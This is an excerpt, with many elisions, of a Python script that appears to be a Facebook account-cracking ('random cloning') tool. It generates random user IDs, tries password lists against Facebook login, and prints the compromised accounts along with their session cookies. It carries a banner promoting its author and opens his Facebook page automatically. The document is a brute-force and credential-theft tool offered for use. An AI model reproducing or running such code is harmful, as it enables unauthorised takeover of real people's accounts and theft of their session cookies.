...
for xd in range(10000):
    ...
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
os.system('xdg-open https://www.facebook.com/sjjakir.jakir')
logo = ("""
   ▄▄▄██▀▀▀▄▄▄       ██ ▄█▀ ██▓ ██▀███     
   ▒██  ▒████▄     ██▄█▒ ▓██▒▓██ ▒ ██▒   
   ░██  ▒██  ▀█▄  ▓███▄░ ▒██▒▓██ ░▄█ ▒   
▓██▄██▓ ░██▄▄▄▄██ ▓██ █▄ ░██░▒██▀▀█▄     
 ...
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 ┃ [✓] AUTHOR\033[1;91m  :\033[1;92mVPN JAKIR
 ┃ [✓] FACEBOOK\033[1;91m:\033[1;92mSJ JAKIR JAKIR 
 ┃ [✓] GITHUB\033[1;91m  :\033[1;92mVpn-jakir
 ┃ [✓] TOOLS\033[1;91m   :\033[1;92mRANDOM CLONING
 ┃ [✓] WORKING\033[1;91m :\033[1;92mDATA&WIFI
 ┃ [✓] VERSION\033[1;91m :\033[1;92mV.1
 ┃ [✓] WHATSAPP\033[1;91m: \033[1;92m01925052074
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
...
class Main:
    def __init__(self):
        ...
        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        Mumit =input(" [?] Choose : ")
        os.system('xdg-open https://www.facebook.com/sjjakir.jakir?mibextid=ZbWKwL/')
        if Mumit in ["1", "01"]:
            num()
        if Mumit in ["2","02"]:
            gml()
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mVPN.JAKIR \033[1;97m] > [%s/%s] > [OK👙\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP🩲\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
    ...
    'upgrade-insecure-requests': '1',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[JAKIR -OK👙] {uid} | {ps}")
                print(f" Cookie : {coki}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[JAKIR -CP🩲] {cid}|{ps}")
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[VPN.JAKIR ] \033[1;92m%s\033[m |\033[m[\033[mOK🩲:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()#6D7D7D